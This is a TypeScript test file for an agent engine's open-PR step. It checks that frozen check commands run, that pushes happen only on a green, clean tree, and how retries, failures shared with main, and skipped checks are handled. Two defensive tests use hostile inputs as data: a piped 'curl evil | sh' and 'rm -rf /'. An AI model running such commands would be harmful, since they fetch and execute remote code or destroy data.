import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import type { TaskStage } from '@jarvis/shared';
import { taskEvent } from '../../domain/index.js';
import { ForbiddenError } from '../errors.js';
import { buildTestApp, type TestApp } from '../testing/build-test-app.js';
import { createTaskInNewThread } from '../testing/create-task-flow.js';
import { identityOfProcess } from '../testing/pr-open-flow.js';
import type { OpenPrResult } from './open-pr.js';

const TEXT = { title: 'Add /health', body: '## What\nA route.' };
const SHA = 'a1b2c3d4e5f60718293a4b5c6d7e8f9012345678';

async function setup(stage: TaskStage = 'Implementing', options = {}) {
  const app = buildTestApp(options);
  const seeded = await app.seed.task({ stage });
  return { app, ...seeded, worker: app.identity.worker(seeded.task) };
}

const types = (app: TestApp): string[] => app.db.tables.journal.map((e) => e.type);

/** Nothing left the engine: no push and no pull request. */
function expectNothingPublished(app: TestApp): void {
  expect(app.branchPublisher.pushes).toEqual([]);
  expect(app.codeHost.pullRequests).toEqual([]);
}

/** What approving a spec card writes: the list the owner read. */
const freeze = (app: TestApp, taskId: string, commands: string[]): Promise<void> =>
  app.uow.run((tx) =>
    tx.journal.append(
      taskEvent(taskId, 'checks_fixed', app.clock.now(), 'owner', {
        commands,
        source: 'agents_md',
        cardId: 'm1',
      }),
    ),
  );

const tick = (): Promise<void> => new Promise((resolve) => setImmediate(resolve));

describe('OpenPr — the green path', () => {
  it('runs the checks on the worktree, pushes the sha, opens the draft PR and moves to PR Open', async () => {
    const { app, task, thread, worker } = await setup('Implementing');

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toEqual({
      ok: true,
      number: 7,
      url: 'https://github.com/o/r/pull/7',
      headSha: SHA,
      created: true,
    });
    expect(app.checkRunner.calls).toHaveLength(1);
    expect(app.checkRunner.calls[0]).toMatchObject({
      cwd: `/jarvis/worktrees/${task.id}`,
      commands: ['pnpm test', 'pnpm typecheck'],
      timeoutMs: 15 * 60_000,
    });
    expect(app.branchPublisher.pushes).toEqual([
      { taskId: task.id, repo: { owner: 'acme', name: 'app' }, sha: SHA },
    ]);
    const [created] = app.codeHost.pullRequests;
    expect(created?.input).toMatchObject({
      head: `jarvis/${task.id}`,
      base: 'main',
      title: TEXT.title,
    });
    expect(created?.input.body).toContain(TEXT.body);
    expect(created?.input.body).toContain('## Checks (run by Jarvis)');
    expect(created?.input.body).toMatch(/- ✓ `pnpm test` — .* \(a1b2c3d\)/);
    expect(app.task(task.id)).toMatchObject({
      stage: 'PR Open',
      pr: { number: 7, url: 'https://github.com/o/r/pull/7' },
    });
    expect(app.db.tables.watches.get(task.id)).toMatchObject({ prNumber: 7 });
    const results = app.messagesOf(thread.id).filter((m) => m.kind === 'result');
    expect(results).toHaveLength(1);
    expect(results[0]?.body).toMatchObject({ summary: 'Draft PR #7 opened' });
  });

  it('journals the whole path in order, and the sha pushed is the sha the gate started on', async () => {
    const { app, worker } = await setup('Reviewing');

    await app.openPr.execute(worker, TEXT);

    const order = [
      'checks_fixed',
      'checks_started',
      'stage_changed',
      'checks_passed',
      'branch_pushed',
      'pr_created',
      'stage_changed',
      'pr_opened',
    ];
    const seen = types(app).filter((t) => order.includes(t));
    expect(seen.slice(-order.length)).toEqual(order);
    const started = app.db.tables.journal.find((e) => e.type === 'checks_started');
    const pushed = app.db.tables.journal.find((e) => e.type === 'branch_pushed');
    expect(started?.data['headSha']).toBe(SHA);
    expect(pushed?.data['headSha']).toBe(SHA);
    expect(app.branchPublisher.pushes[0]?.sha).toBe(started?.data['headSha']);
    const moves = app.db.tables.journal
      .filter((e) => e.type === 'stage_changed')
      .slice(-2)
      .map((e) => [e.data['to'], e.data['cause'], e.actor]);
    expect(moves).toEqual([
      ['Verifying', 'checks_started', 'system'],
      ['PR Open', 'pr_opened', 'system'],
    ]);
  });

  it('names the files that define the checks when the PR changed them', async () => {
    const { app, worker } = await setup();
    app.branchPublisher.state = {
      dirtyFiles: [],
      commitsAhead: 2,
      changedFiles: ['src/a.ts', 'package.json'],
    };

    await app.openPr.execute(worker, TEXT);

    expect(app.codeHost.pullRequests.at(-1)?.input.body).toContain(
      'Files that define the checks changed in this PR: `package.json`',
    );
  });

  it('a green gate resets the failure counter', async () => {
    const { app, task, worker } = await setup();
    app.checkRunner.script('pnpm test', { exitCode: 1 });
    await app.openPr.execute(worker, TEXT);
    await app.openPr.execute(worker, TEXT);
    expect(app.task(task.id).counters.checkRetries).toBe(2);
    app.checkRunner.script('pnpm test', { exitCode: 0 });

    const result = await app.openPr.execute(worker, TEXT);

    expect(result.ok).toBe(true);
    expect(app.task(task.id).counters.checkRetries).toBe(0);
  });

  it('a call from Fixing keeps Fixing while the gate runs, then ends in PR Open and posts no second card', async () => {
    const { app, task, thread, worker } = await setup('Fixing');
    await app.uow.run((tx) =>
      tx.tasks.save({
        ...app.task(task.id),
        pr: { number: 7, url: 'https://github.com/o/r/pull/7' },
      }),
    );
    let release: () => void = () => undefined;
    app.checkRunner.hold = new Promise<void>((resolve) => {
      release = resolve;
    });

    const running = app.openPr.execute(worker, {});
    await tick();
    expect(app.task(task.id).stage).toBe('Fixing');
    release();
    const result = await running;

    expect(result).toMatchObject({ ok: true, number: 7, created: false });
    expect(app.task(task.id).stage).toBe('PR Open');
    expect(app.codeHost.pullRequests).toEqual([]);
    expect(app.branchPublisher.pushes).toHaveLength(1);
    expect(app.messagesOf(thread.id).filter((m) => m.kind === 'result')).toHaveLength(0);
  });

  it('a call from PR Open (the owner asked for a change) moves to Fixing first, without a fix round', async () => {
    const { app, task, worker } = await setup('PR Open');
    await app.uow.run((tx) =>
      tx.tasks.save({
        ...app.task(task.id),
        pr: { number: 7, url: 'https://github.com/o/r/pull/7' },
      }),
    );
    const counters = app.task(task.id).counters;

    const result = await app.openPr.execute(worker, {});

    expect(result).toMatchObject({ ok: true, number: 7, created: false });
    const moves = app.db.tables.journal.filter((e) => e.type === 'stage_changed').slice(-2);
    expect(moves.map((e) => [e.actor, e.data])).toMatchObject([
      ['owner', { from: 'PR Open', to: 'Fixing', cause: 'owner_request' }],
      ['system', { from: 'Fixing', to: 'PR Open', cause: 'pr_opened' }],
    ]);
    expect(app.task(task.id).counters).toEqual(counters);
    expect(app.branchPublisher.pushes).toHaveLength(1);
  });

  it('keeps the watcher state while the PR stays the same', async () => {
    const { app, task, worker } = await setup('Fixing');
    const state = { headSha: 'abc', checks: [], reviews: [], seenCommentIds: ['issue:3'] };
    await app.uow.run(async (tx) => {
      await tx.tasks.save({ ...app.task(task.id), pr: { number: 7, url: 'u' } });
      await tx.watches.save({
        taskId: task.id,
        prNumber: 7,
        state,
        lastCheckedAt: null,
        summary: null,
        lastGreen: null,
        rerunHeadSha: null,
      });
    });

    await app.openPr.execute(worker, {});

    expect(app.db.tables.watches.get(task.id)?.state).toEqual(state);
  });

  it('ignores a title and a body once the task has a PR', async () => {
    const { app, task, worker } = await setup('Fixing');
    await app.uow.run((tx) =>
      tx.tasks.save({ ...app.task(task.id), pr: { number: 7, url: 'https://x/7' } }),
    );

    const result = await app.openPr.execute(worker, { title: 'other', body: 'other' });

    expect(result).toMatchObject({ ok: true, created: false, url: 'https://x/7' });
    expect(app.codeHost.pullRequests).toEqual([]);
  });

  it('returns the PR the host already had for the head instead of a second one', async () => {
    const { app, task, worker } = await setup();
    app.codeHost.createPullRequestResult = {
      ok: true,
      number: 9,
      url: 'https://github.com/o/r/pull/9',
      created: false,
    };

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({ ok: true, number: 9, created: false });
    expect(app.task(task.id).pr?.number).toBe(9);
    expect(types(app)).not.toContain('pr_created');
  });
});

describe('OpenPr — a red gate publishes nothing', () => {
  it('leaves the publisher and the host untouched, spends one retry and returns to Implementing', async () => {
    const { app, task, worker } = await setup('Reviewing');
    app.checkRunner.script('pnpm typecheck', { exitCode: 2, tail: 'TS2322: nope' });

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({
      ok: false,
      reason: 'checks_failed',
      attempt: 1,
      max: 3,
      logPath: 'checks/1-a1b2c3d.log',
    });
    const failed = result as Extract<OpenPrResult, { reason: 'checks_failed' }>;
    expect(failed.results.map((r) => [r.command, r.exitCode, r.tail])).toEqual([
      ['pnpm test', 0, ''],
      ['pnpm typecheck', 2, 'TS2322: nope'],
    ]);
    expectNothingPublished(app);
    expect(app.branchPublisher.pushes).toHaveLength(0);
    expect(app.task(task.id)).toMatchObject({
      stage: 'Implementing',
      counters: { checkRetries: 1 },
    });
    expect(types(app)).toContain('checks_failed');
    expect(types(app)).not.toContain('checks_passed');
    const causes = app.db.tables.journal
      .filter((e) => e.type === 'stage_changed')
      .slice(-2)
      .map((e) => e.data['cause']);
    expect(causes).toEqual(['checks_started', 'checks_red']);
  });

  it('runs every command even after a red one, so one round reports all of them', async () => {
    const { app, worker } = await setup();
    app.checkRunner.script('pnpm test', { exitCode: 1 });

    const result = await app.openPr.execute(worker, TEXT);

    expect(app.checkRunner.calls[0]?.commands).toEqual(['pnpm test', 'pnpm typecheck']);
    expect(result).toMatchObject({ ok: false, reason: 'checks_failed' });
  });

  it.each([
    ['a timeout', { exitCode: null, timedOut: true }],
    ['a command that was killed', { exitCode: null, timedOut: false }],
    ['a negative exit code', { exitCode: -1, timedOut: false }],
  ])('treats %s as red', async (_name, script) => {
    const { app, worker } = await setup();
    app.checkRunner.script('pnpm test', script);

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({ ok: false, reason: 'checks_failed' });
    expectNothingPublished(app);
  });

  it('a Fixing task stays Fixing after a red gate', async () => {
    const { app, task, worker } = await setup('Fixing');
    await app.uow.run((tx) =>
      tx.tasks.save({ ...app.task(task.id), pr: { number: 7, url: 'https://x/7' } }),
    );
    app.checkRunner.script('pnpm test', { exitCode: 1 });

    await app.openPr.execute(worker, {});

    expect(app.task(task.id)).toMatchObject({ stage: 'Fixing', counters: { checkRetries: 1 } });
    expectNothingPublished(app);
  });

  it('fails the task when checkRetries is used up, stops its runs and tells the owner', async () => {
    const { app, task, thread, worker } = await setup();
    app.checkRunner.script('pnpm test', { exitCode: 1 });
    for (let attempt = 1; attempt <= 3; attempt += 1) {
      const result = await app.openPr.execute(worker, TEXT);
      expect(result).toMatchObject({ reason: 'checks_failed', attempt, max: 3 });
    }
    app.clearEffects();

    const last = await app.openPr.execute(worker, TEXT);

    expect(last).toMatchObject({ ok: false, reason: 'checks_exhausted', max: 3 });
    expect(app.task(task.id).stage).toBe('Failed');
    expect(app.db.tables.journal.at(-1)).toMatchObject({
      actor: 'system',
      data: { to: 'Failed', cause: 'checks_exhausted' },
    });
    expect(app.task(task.id).reason).toBe('Checks still failing after 3 retries: pnpm test');
    expect(app.runs.calls).toEqual([{ type: 'stop_task_runs', taskId: task.id }]);
    const system = app.messagesOf(thread.id).filter((m) => m.kind === 'system');
    expect(system.at(-1)?.body.text).toContain('failed');
    expectNothingPublished(app);
  });

  it('takes the limit from the current config', async () => {
    const { app, worker } = await setup();
    app.config.set({
      ...app.config.current(),
      limits: { ...app.config.current().limits, checkRetries: 1 },
    });
    app.checkRunner.script('pnpm test', { exitCode: 1 });

    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({
      reason: 'checks_failed',
      max: 1,
    });
    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({ reason: 'checks_exhausted' });
  });

  it('does not count a command that could not be started, and moves nothing back', async () => {
    const { app, task, worker } = await setup();
    app.checkRunner.unavailable = { command: 'pnpm test', detail: 'sh: pnpm: not found' };

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({ ok: false, reason: 'checks_unavailable' });
    expect((result as { detail: string }).detail).toContain('pnpm: not found');
    expect(app.task(task.id).counters.checkRetries).toBe(0);
    expect(types(app)).toContain('checks_unavailable');
    expectNothingPublished(app);
  });
});

describe('OpenPr — the tree must be the commit that is checked', () => {
  it('refuses a dirty tree without running anything', async () => {
    const { app, worker } = await setup();
    app.branchPublisher.state = {
      dirtyFiles: ['src/a.ts', 'notes.md'],
      commitsAhead: 1,
      changedFiles: [],
    };

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({
      ok: false,
      reason: 'dirty_tree',
      files: ['src/a.ts', 'notes.md'],
    });
    expect(app.checkRunner.calls).toEqual([]);
    expectNothingPublished(app);
  });

  it('refuses a branch with no commit beyond the base', async () => {
    const { app, worker } = await setup();
    app.branchPublisher.state = { dirtyFiles: [], commitsAhead: 0, changedFiles: [] };

    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({
      ok: false,
      reason: 'no_commits',
    });
    expect(app.checkRunner.calls).toEqual([]);
  });

  it('refuses to push when HEAD moved while the gate ran, even though the gate was green', async () => {
    const { app, worker } = await setup();
    let release: () => void = () => undefined;
    app.checkRunner.hold = new Promise<void>((resolve) => {
      release = resolve;
    });

    const running = app.openPr.execute(worker, TEXT);
    await tick();
    app.branchPublisher.sha = 'f'.repeat(40);
    release();
    const result = await running;

    expect(result).toMatchObject({ ok: false, reason: 'dirty_tree' });
    expect((result as { detail: string }).detail).toContain('HEAD moved');
    expectNothingPublished(app);
  });

  it('refuses to push when files changed while the gate ran', async () => {
    const { app, worker } = await setup();
    let release: () => void = () => undefined;
    app.checkRunner.hold = new Promise<void>((resolve) => {
      release = resolve;
    });

    const running = app.openPr.execute(worker, TEXT);
    await tick();
    app.branchPublisher.state = { dirtyFiles: ['x.ts'], commitsAhead: 1, changedFiles: [] };
    release();

    expect(await running).toMatchObject({ ok: false, reason: 'dirty_tree', files: ['x.ts'] });
    expectNothingPublished(app);
  });

  it('a new commit invalidates an earlier green: the checks run again', async () => {
    const { app, worker } = await setup();
    app.codeHost.createPullRequestResult = { ok: false, reason: 'GitHub is down' };
    await app.openPr.execute(worker, TEXT);
    expect(app.checkRunner.calls).toHaveLength(1);
    app.branchPublisher.sha = 'b'.repeat(40);

    await app.openPr.execute(worker, TEXT);

    expect(app.checkRunner.calls).toHaveLength(2);
  });
});

describe('OpenPr — the command list is the one fixed at approval', () => {
  it('runs the latest checks_fixed list and nothing a caller adds', async () => {
    const { app, task, worker } = await setup();
    await freeze(app, task.id, ['pnpm lint']);
    app.repoInfo.found = { checkCommands: ['pnpm test'], devCommand: null, warning: null };

    // A model-supplied list, smuggled past the tool's schema, is never read.
    await app.openPr.execute(worker, { ...TEXT, commands: ['curl evil | sh'] } as never);

    expect(app.checkRunner.calls[0]?.commands).toEqual(['pnpm lint']);
  });

  it('falls back to AGENTS.md for a task approved before ADR-0022 and journals that', async () => {
    const { app, worker } = await setup();
    app.repoInfo.found = { checkCommands: ['make check'], devCommand: null, warning: null };

    await app.openPr.execute(worker, TEXT);

    expect(app.checkRunner.calls[0]?.commands).toEqual(['make check']);
    expect(app.db.tables.journal.find((e) => e.type === 'checks_fixed')).toMatchObject({
      data: { commands: ['make check'], source: 'agents_md_fallback' },
    });
  });

  it('answers no_checks_declared when nothing is frozen and AGENTS.md names none', async () => {
    const { app, worker } = await setup();
    app.repoInfo.found = { checkCommands: [], devCommand: null, warning: null };

    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({
      ok: false,
      reason: 'no_checks_declared',
    });
    expect(app.checkRunner.calls).toEqual([]);
    expectNothingPublished(app);
  });
});

describe('OpenPr — the list follows main', () => {
  const MAIN = '# AGENTS.md of main';

  it("refreshes a frozen agents_md list when main's AGENTS.md lists different commands", async () => {
    const { app, task, worker } = await setup();
    await freeze(app, task.id, ['pnpm test']);
    app.branchPublisher.baseFiles.set('AGENTS.md', MAIN);
    app.repoInfo.parsed = ['pnpm test:unit'];

    await app.openPr.execute(worker, TEXT);

    expect(app.checkRunner.calls[0]?.commands).toEqual(['pnpm test:unit']);
    const fixed = app.db.tables.journal.filter((e) => e.type === 'checks_fixed');
    expect(fixed).toHaveLength(2);
    expect(fixed[1]).toMatchObject({
      actor: 'system',
      data: {
        commands: ['pnpm test:unit'],
        source: 'base_refresh',
        cardId: null,
        previous: ['pnpm test'],
      },
    });
    const notes = app
      .messagesOf(task.threadId)
      .filter((m) => JSON.stringify(m.body).includes('pnpm test:unit'));
    expect(notes).toHaveLength(1);
    expect(notes[0]?.kind).toBe('system');
  });

  it('leaves a worker-found list alone', async () => {
    const { app, task, worker } = await setup();
    await app.uow.run((tx) =>
      tx.journal.append(
        taskEvent(task.id, 'checks_fixed', app.clock.now(), 'owner', {
          commands: ['pnpm test'],
          source: 'worker',
          cardId: 'm1',
        }),
      ),
    );
    app.branchPublisher.baseFiles.set('AGENTS.md', MAIN);
    app.repoInfo.parsed = ['pnpm test:unit'];

    await app.openPr.execute(worker, TEXT);

    expect(app.checkRunner.calls[0]?.commands).toEqual(['pnpm test']);
    expect(types(app).filter((t) => t === 'checks_fixed')).toHaveLength(1);
    expect(app.branchPublisher.baseFileCalls).toBe(0);
  });

  it("does nothing when main's list is the same", async () => {
    const { app, task, worker } = await setup();
    await freeze(app, task.id, ['pnpm test']);
    app.branchPublisher.baseFiles.set('AGENTS.md', MAIN);
    app.repoInfo.parsed = ['pnpm test'];

    await app.openPr.execute(worker, TEXT);
    await app.openPr.execute(worker, TEXT);

    expect(types(app).filter((t) => t === 'checks_fixed')).toHaveLength(1);
    expect(JSON.stringify(app.messagesOf(task.threadId))).not.toContain('Checks updated');
  });

  it("runs the frozen list when main's AGENTS.md is missing or names no commands", async () => {
    const missing = await setup();
    await freeze(missing.app, missing.task.id, ['pnpm test']);
    await missing.app.openPr.execute(missing.worker, TEXT);
    expect(missing.app.checkRunner.calls[0]?.commands).toEqual(['pnpm test']);

    const empty = await setup();
    await freeze(empty.app, empty.task.id, ['pnpm test']);
    empty.app.branchPublisher.baseFiles.set('AGENTS.md', MAIN);
    empty.app.repoInfo.parsed = [];
    await empty.app.openPr.execute(empty.worker, TEXT);
    expect(empty.app.checkRunner.calls[0]?.commands).toEqual(['pnpm test']);
    expect(types(empty.app).filter((t) => t === 'checks_fixed')).toHaveLength(1);
  });

  it('a refresh after a green gate and a host_error re-runs the gate with the new list', async () => {
    const { app, task, worker } = await setup();
    await freeze(app, task.id, ['pnpm test']);
    app.codeHost.createPullRequestResult = { ok: false, reason: 'GitHub is down' };
    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({ reason: 'host_error' });

    app.branchPublisher.baseFiles.set('AGENTS.md', MAIN);
    app.repoInfo.parsed = ['pnpm test:unit'];
    app.codeHost.createPullRequestResult = { ok: true, number: 7, url: 'u', created: true };
    expect(await app.openPr.execute(worker, TEXT)).toMatchObject({ ok: true });

    expect(app.checkRunner.calls).toHaveLength(2);
    expect(app.checkRunner.calls[1]?.commands).toEqual(['pnpm test:unit']);
    expect(app.codeHost.pullRequests.at(-1)?.input.body).toContain('pnpm test:unit');
  });

  it('treats a frozen row with source null like agents_md', async () => {
    const { app, task, worker } = await setup();
    await app.uow.run((tx) =>
      tx.journal.append(
        taskEvent(task.id, 'checks_fixed', app.clock.now(), 'owner', {
          commands: ['pnpm test'],
          cardId: 'm1',
        }),
      ),
    );
    app.branchPublisher.baseFiles.set('AGENTS.md', MAIN);
    app.repoInfo.parsed = ['pnpm test:unit'];

    await app.openPr.execute(worker, TEXT);

    expect(app.checkRunner.calls[0]?.commands).toEqual(['pnpm test:unit']);
  });
});

describe('OpenPr — red on main too', () => {
  const BASE = 'b4s3b4s3e5f60718293a4b5c6d7e8f9012345678';
  const redBoth = (app: TestApp, command: string): void => {
    app.checkRunner.script(command, { exitCode: 1, tail: 'boom' });
    app.checkRunner.scriptOnBase(command, { exitCode: 1, tail: 'boom' });
  };
  const ofType = (app: TestApp, type: string) =>
    app.db.tables.journal.filter((e) => e.type === type);

  it('opens the PR when every red command is also red on main, counting no retry', async () => {
    const { app, task, worker } = await setup();
    redBoth(app, 'pnpm test');

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({ ok: true, created: true });
    expect(app.task(task.id).counters.checkRetries).toBe(0);
    expect(ofType(app, 'check_preexisting')).toHaveLength(1);
    expect(ofType(app, 'check_preexisting')[0]?.data).toMatchObject({
      command: 'pnpm test',
      baseSha: BASE,
      headSha: SHA,
    });
    expect(ofType(app, 'checks_passed')[0]?.data['preexisting']).toEqual(['pnpm test']);
    const body = app.codeHost.pullRequests[0]?.input.body ?? '';
    expect(body).toContain('## Fails on main too');
    expect(body).toContain('`pnpm test` — red on b4s3b4s as well; CI decides.');
    expect(body).toContain('Output on this branch');
    expect(body).toContain('boom');
  });

  it('counts a retry when the command is green on main', async () => {
    const { app, task, worker } = await setup();
    app.checkRunner.script('pnpm test', { exitCode: 1 });

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({ ok: false, reason: 'checks_failed', preexisting: [] });
    expect(app.task(task.id).counters.checkRetries).toBe(1);
    expect(app.branchPublisher.onBaseCalls).toEqual([BASE]);
  });

  it('mixed: one red on both, one red only on head', async () => {
    const { app, task, worker } = await setup();
    redBoth(app, 'pnpm test');
    app.checkRunner.script('pnpm typecheck', { exitCode: 2 });

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({
      ok: false,
      reason: 'checks_failed',
      preexisting: ['pnpm test'],
    });
    expect(app.task(task.id).counters.checkRetries).toBe(1);
    expectNothingPublished(app);
  });

  it('on exhaustion, the failing list leaves out what main fails too', async () => {
    const { app, task, worker } = await setup();
    redBoth(app, 'pnpm test');
    app.checkRunner.script('pnpm typecheck', { exitCode: 2 });

    let last: OpenPrResult | undefined;
    for (let i = 0; i < 4; i += 1) {
      await app.reportStage.execute(worker, { stage: 'Implementing' });
      last = await app.openPr.execute(worker, TEXT);
    }

    expect(last).toMatchObject({
      ok: false,
      reason: 'checks_exhausted',
      preexisting: ['pnpm test'],
    });
    const reason = String(
      app.db.tables.journal.find((e) => e.type === 'stage_changed' && e.data['to'] === 'Failed')
        ?.data['reason'],
    );
    expect(reason).toContain('pnpm typecheck');
    expect(reason).not.toContain('pnpm test');
    expect(app.task(task.id).stage).toBe('Failed');
  });

  it('runs only the red commands on base, and only once per base sha', async () => {
    const { app, worker } = await setup();
    redBoth(app, 'pnpm test');
    expect(app.checkRunner.calls).toHaveLength(0);

    await app.openPr.execute(worker, TEXT);
    // `pnpm typecheck` is green on the branch: only the red one runs on base.
    expect(app.checkRunner.calls).toHaveLength(2);
    expect(app.checkRunner.calls.at(-1)?.commands).toEqual(['pnpm test']);
    expect(app.checkRunner.calls.at(-1)?.logPath).toContain('checks/1-a1b2c3d-base.log');

    // A new head, same merge base: the cached base result answers.
    app.branchPublisher.sha = 'c0ffee00e5f60718293a4b5c6d7e8f9012345678';
    app.codeHost.createPullRequestResult = { ok: false, reason: 'down' };
    const before = app.checkRunner.calls.length;
    await app.openPr.execute(worker, TEXT);

    expect(app.checkRunner.calls.length).toBe(before + 1);
    expect(app.branchPublisher.onBaseCalls).toHaveLength(1);
    expect(ofType(app, 'check_base_result')).toHaveLength(1);
  });

  it('a base run that throws counts as green on base', async () => {
    const { app, task, worker } = await setup();
    app.checkRunner.script('pnpm test', { exitCode: 1 });
    app.branchPublisher.onBaseError = new Error('worktree is dirty');

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({ ok: false, reason: 'checks_failed', preexisting: [] });
    expect(app.task(task.id).counters.checkRetries).toBe(1);
    expect(ofType(app, 'check_base_result')).toHaveLength(0);
    expect(ofType(app, 'base_comparison_failed')[0]?.data['detail']).toBe('worktree is dirty');
  });

  it('refuses, without a retry, when the worktree is not back on the task head after the base run', async () => {
    const { app, task, worker } = await setup();
    app.checkRunner.script('pnpm test', { exitCode: 1 });
    app.branchPublisher.headAfterBase = BASE;

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({ ok: false, reason: 'checks_unavailable' });
    expect((result as { detail: string }).detail).toContain('could not restore your worktree');
    expect(ofType(app, 'base_comparison_failed')).toHaveLength(1);
    expect(app.task(task.id).counters.checkRetries).toBe(0);
    expectNothingPublished(app);
  });

  it('a command that could not be started on base is green on base', async () => {
    const { app, task, worker } = await setup();
    app.checkRunner.script('pnpm test', { exitCode: 1 });
    app.branchPublisher.onBaseHook = () => {
      app.checkRunner.unavailable = { command: 'pnpm test', detail: 'exit 127' };
    };

    const result = await app.openPr.execute(worker, TEXT);

    expect(result).toMatchObject({ ok: false, reason: 'checks_failed', preexisting: [] });
    expect(app.task(task.id).counters.checkRetries).toBe(1);
    expect(ofType(app, 'check_base_result')).toHaveLength(0);
  });

  it('on a task that already has a PR, a preexisting failure is told in the thread', async () => {
    const { app, worker, thread } = await setup();
    redBoth(app, 'pnpm test');
    await app.openPr.execute(worker, TEXT);
    app.branchPublisher.sha = 'c0ffee00e5f60718293a4b5c6d7e8f9012345678';

    const result = await app.openPr.execute(worker, {});

    expect(result).toMatchObject({ ok: true, created: false });
    expect(app.codeHost.pullRequests).toHaveLength(1);
    const texts = app
      .messagesOf(thread.id)
      .filter((m) => m.kind === 'system')
      .map((m) => (m.body as { text: string }).text)
      .filter((t) => t.startsWith('Fails on main too'));
    expect(texts).toEqual(['Fails on main too: pnpm test']);
  });
});

describe('OpenPr — skipping a check', () => {
  const REASON = 'needs Postgres; CI runs it';
  const SKIP = [{ command: 'pnpm test', reason: REASON }];
  const NEW_SHA = 'c0ffee00e5f60718293a4b5c6d7e8f9012345678';
  const ofType = (app: TestApp, type: string) =>
    app.db.tables.journal.filter((e) => e.type === type);
  /** A red `pnpm test` on the current head, as the worker's first call leaves it. */
  async function redOnce() {
    const ctx = await setup();
    ctx.app.checkRunner.script('pnpm test', { exitCode: 1, tail: 'no database' });
    const red = await ctx.app.openPr.execute(ctx.worker, TEXT);
    expect(red).toMatchObject({ ok: false, reason: 'checks_failed' });
    ctx.app.checkRunner.calls.length = 0;
    return ctx;
  }

  it('skips a command that ran red on this head and opens the PR', async () => {
    const { app, task, worker } = await redOnce();

    const result = await app.openPr.execute(worker, { ...TEXT, skip: SKIP });

    expect(result).toMatchObject({ ok: true, created: true });
    expect(app.checkRunner.calls).toHaveLength(1);
    expect(app.checkRunner.calls[0]?.commands).toEqual(['pnpm typecheck']);
    expect(ofType(app, 'check_skipped')).toHaveLength(1);
    expect(ofType(app, 'check_skipped')[0]?.data).toMatchObject({
      command: 'pnpm test',
      reason: REASON,
      headSha: SHA,
    });
    const body = app.codeHost.pullRequests[0]?.input.body ?? '';
    expect(body).toContain('## Checks skipped locally — CI decides');
    expect(body).toContain(`- \`pnpm test\` — ${REASON}`);
    expect(body).toContain('no database');
    expect(body).not.toContain('✗ `pnpm test`');
    expect(app.task(task.id).stage).toBe('PR Open');
    expect(app.task(task.id).counters.checkRetries).toBe(0);
  });

  it('with every command skipped, no gate runs and the PR opens', async () => {
    const { app, worker } = await setup();
    app.checkRunner.script('pnpm test', { exitCode: 1, tail: 'no database' });
    app.checkRunner.script('pnpm typecheck', { exitCode: 2, tail: 'bad types' });
    await app.openPr.execute(worker, TEXT);
    app.checkRunner.calls.length = 0;

    const result = await app.openPr.execute(worker, {
      ...TEXT,
      skip: [...SKIP, { command: 'pnpm typecheck', reason: 'cannot be made green here' }],
    });

    expect(result).toMatchObject({ ok: true });
    expect(app.checkRunner.calls).toHaveLength(0);
    expect(ofType(app, 'check_skipped')).toHaveLength(2);
    const body = app.codeHost.pullRequests[0]?.input.body ?? '';
    expect(body).toContain('## Checks skipped locally');
    expect(body).not.toContain('## Checks (run by Jarvis)');
  });

  it('refuses to skip a command that never ran red on this head', async () => {
    const { app, task, worker } = await redOnce();
    app.branchPublisher.sha = NEW_SHA;
    const retries = app.task(task.id).counters.checkRetries;
    const journalBefore = app.db.tables.journal.length;

    const result = await app.openPr.execute(worker, { ...TEXT, skip: SKIP });

    expect(result).toMatchObject({ ok: false, reason: 'skip_not_allowed' });
    expect((result as { detail: string }).detail).toContain('`pnpm test`');
    expect((result as { detail: string }).detail).toContain('has not run red on c0ffee0');
    expect(app.checkRunner.calls).toHaveLength(0);
    expectNothingPublished(app);
    expect(app.task(task.id).counters.checkRetries).toBe(retries);
    expect(app.db.tables.journal.length).toBe(journalBefore);
  });

  it('refuses to skip a command not in the frozen list', async () => {
    const { app, task, worker } = await redOnce();
    const journalBefore = app.db.tables.journal.length;

    const result = await app.openPr.execute(worker, {
      ...TEXT,
      skip: [{ command: 'rm -rf /', reason: 'not a real check at all' }],
    });

    expect(result).toMatchObject({ ok: false, reason: 'skip_not_allowed' });
    expect((result as { detail: string }).detail).toContain('`rm -rf /`');
    expect((result as { detail: string }).detail).toContain('not in the frozen list');
    expect(app.checkRunner.calls).toHaveLength(0);
    expectNothingPublished(app);
    expect(app.task(task.id).counters.checkRetries).toBe(1);
    expect(app.db.tables.journal.length).toBe(journalBefore);
  });

  it('a skip on a task that already has a PR pushes, leaves the PR body alone and tells the thread', async () => {
    const { app, worker, thread } = await setup();
    await app.openPr.execute(worker, TEXT);
    app.branchPublisher.sha = NEW_SHA;
    app.checkRunner.script('pnpm test', { exitCode: 1, tail: 'no database' });
    const red = await app.openPr.execute(worker, {});
    expect(red).toMatchObject({ ok: false, reason: 'checks_failed' });
    const before = structuredClone(app.codeHost.pullRequests);

    const result = await app.openPr.execute(worker, { skip: SKIP });

    expect(result).toMatchObject({ ok: true, created: false });
    expect(app.codeHost.pullRequests).toEqual(before);
    expect(app.branchPublisher.pushes.at(-1)?.sha).toBe(NEW_SHA);
    const texts = app
      .messagesOf(thread.id)
      .filter((m) => m.kind === 'system')
      .map((m) => (m.body as { text: string }).text)
      .filter((t) => t.startsWith('Skipped locally'));
    expect(texts).toEqual([`Skipped locally: pnpm test — ${REASON}`]);
  });
});

describe('OpenPr — a failure after a green gate does not repeat the gate', () => {
  it('host_error: the next call for the same commit skips the checks and finishes', async () => {
